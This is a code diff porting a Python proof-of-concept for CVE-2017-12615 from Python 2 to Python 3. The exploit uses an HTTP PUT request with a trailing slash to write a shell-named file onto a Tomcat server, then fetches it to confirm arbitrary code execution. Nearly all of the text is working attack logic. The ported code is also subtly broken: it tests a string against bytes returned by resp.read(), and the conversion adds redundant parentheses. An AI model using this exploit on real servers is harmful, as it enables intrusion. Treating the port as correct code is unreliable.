@@ -2,10 +2,10 @@
 # author:nearg1e
 
 ''' poc for CVE-2017-12615 '''
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 import random
 import string
-import urlparse
+import urllib.parse
 
 
 def get_plugin_info():
@@ -22,11 +22,11 @@ def get_plugin_info():
     return plugin_info
 
 
-class PutRequest(urllib2.Request):
+class PutRequest(urllib.request.Request):
     '''support put method in urllib2'''
     def __init__(self, *args, **kwargs):
         self._method = "PUT"
-        return urllib2.Request.__init__(self, *args, **kwargs)
+        return urllib.request.Request.__init__(self, *args, **kwargs)
 
     def get_method(self, *args, **kwargs):
         return "PUT"
@@ -43,27 +43,27 @@ def check(host, port, timeout):
         url = "https://%s" % (host)
     else:
         url = "http://%s:%d" % (host, port)
-    url = urllib2.urlopen(url, timeout=timeout).geturl()
-    shell_url = urlparse.urljoin(url, filename)
+    url = urllib.request.urlopen(url, timeout=timeout).geturl()
+    shell_url = urllib.parse.urljoin(url, filename)
     target_url = shell_url + "/"
     request = PutRequest(target_url, payload)
     try:
-        urllib2.urlopen(request, timeout=timeout)
+        urllib.request.urlopen(request, timeout=timeout)
     except Exception as e:
-        print("[!] {}".format(str(e)))
+        print(("[!] {}".format(str(e))))
         return False
     else:
         try:
-            resp = urllib2.urlopen(shell_url, timeout=timeout)
+            resp = urllib.request.urlopen(shell_url, timeout=timeout)
         except Exception as e:
-            print("[!] get shell url error {}".format(str(e)))
+            print(("[!] get shell url error {}".format(str(e))))
             return False
         else:
             if "7852" in resp.read():
-                result += u"存在任意代码执行风险"
-                result += u" 地址: {}".format(shell_url)
+                result += "存在任意代码执行风险"
+                result += " 地址: {}".format(shell_url)
                 return result
 
 if __name__ == '__main__':
-    print(check("127.0.0.1", 8080, 5))
+    print((check("127.0.0.1", 8080, 5)))
     
